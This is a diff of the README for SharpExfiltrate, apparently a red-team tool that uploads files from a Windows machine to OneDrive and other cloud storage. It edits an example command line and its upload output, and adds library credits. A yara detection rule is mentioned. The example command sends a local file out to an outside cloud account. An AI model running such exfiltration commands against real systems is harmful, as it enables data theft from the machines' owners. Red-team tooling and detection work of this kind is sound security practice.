@@ -6,7 +6,7 @@ While exfiltrating a large amount of data will require the output stream to be c
 # Example Run
 
 ```
-.\SharpExfiltrate.exe OneDrive -u <redacted> --password "<redacted> " --filepath "C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe"
+.\SharpExfiltrate.exe OneDrive --username <redacted> --password "<redacted>" --filepath "C:\Users\<redacted>\Downloads\balenaEtcher-Setup-1.5.120.exe"
 
   __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___
 /' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __|
@@ -22,17 +22,11 @@ While exfiltrating a large amount of data will require the output stream to be c
 [+] Starting OneDrive upload
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (7%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (14%)
-[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (21%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (28%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (35%)
-[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (42%)
-[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (49%)
-[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (56%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (64%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (71%)
-[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (78%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (85%)
-[+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (92%)
 [+] Uploading DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip 140,5MB - (99%)
 [+] Upload completed, file located: https://<redacted>-my.sharepoint.com/personal/<redacted>/Documents/DESKTOP-4P9DIHS_20210911T1240UTC_balenaEtcher-Setup-1.5.120.zip
 ```
@@ -197,4 +191,9 @@ See the included yara rule :)
 # Credits
 
 * https://github.com/KoenZomers/OneDriveAPI (OneDrive API in .NET)
-* 
+* https://medium.com/geekculture/upload-files-to-google-drive-with-c-c32d5c8a7abc (Usage of Google Drive API in .NET)
+* https://github.com/googleapis/google-api-dotnet-client (Google Drive API in .NET)
+* https://github.com/Azure/azure-storage-net (Azure Storage API in .NET)
+* https://github.com/icsharpcode/SharpZipLib (ZIP API in .NET)
+* https://github.com/CCob/dnMerge (Merges all them deps into the binary)
+* https://github.com/GhostPack/Rubeus/blob/master/Rubeus.yar (Template for my yara rules)
